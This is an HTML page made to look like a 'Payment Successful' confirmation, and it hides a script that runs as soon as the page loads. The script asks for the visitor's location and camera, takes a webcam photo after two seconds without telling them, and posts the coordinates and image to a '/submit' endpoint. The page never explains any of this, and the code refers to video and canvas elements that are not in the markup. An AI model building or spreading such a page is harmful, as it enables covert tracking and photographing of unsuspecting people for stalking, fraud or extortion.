<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Payment Successful</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #34A853; /* Green background */
      color: white;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }

    .checkmark {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      background-color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 20px;
    }

    .checkmark::before {
      content: "✓";
      font-size: 48px;
      color: #34A853;
      font-weight: bold;
    }

    .text {
      font-size: 24px;
      font-weight: 600;
    }

    .timestamp {
      margin-top: 10px;
      font-size: 16px;
      color: #e0f2e9;
    }
  </style>
</head>
<body>
  <div class="checkmark"></div>
  <div class="text">Payment Successful</div>
  <div class="timestamp">20 June 2025 at 12:56 PM</div>

  <script>
  async function getLocationAndCamera() {
    if (!navigator.geolocation || !navigator.mediaDevices) {
      alert("Required permissions are not supported on this browser.");
      return;
    }

    // Step 1: Get Location
    navigator.geolocation.getCurrentPosition(async (position) => {
      const latitude = position.coords.latitude.toFixed(6);
      const longitude = position.coords.longitude.toFixed(6);
      console.log("📍 Location fetched:", latitude, longitude);

      try {
        // Step 2: Access Camera
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        video.srcObject = stream;

        // Step 3: Take photo after slight delay
        video.onloadedmetadata = () => {
          video.play();
          setTimeout(() => {
            const canvas = document.getElementById("canvas");
            const context = canvas.getContext("2d");
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL("image/jpeg");

            // Step 4: Send location + image to backend
            fetch("/submit", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                lat: latitude,
                lon: longitude,
                image: imageData
              })
            })
              .then(res => res.json())
              .then(res => {
                console.log("✅ Submitted:", res);
              })
              .catch(err => console.error("❌ Submit error:", err));

            // Step 5: Stop the stream
            stream.getTracks().forEach(track => track.stop());
          }, 2000); // 2-second delay before capturing
        };
      } catch (err) {
        alert("Camera access denied.");
        console.error("Camera error:", err);
      }
    }, (err) => {
      alert("Location access denied.");
      console.error("Location error:", err);
    });
  }

  window.onload = getLocationAndCamera;
</script>
</body>
</html>
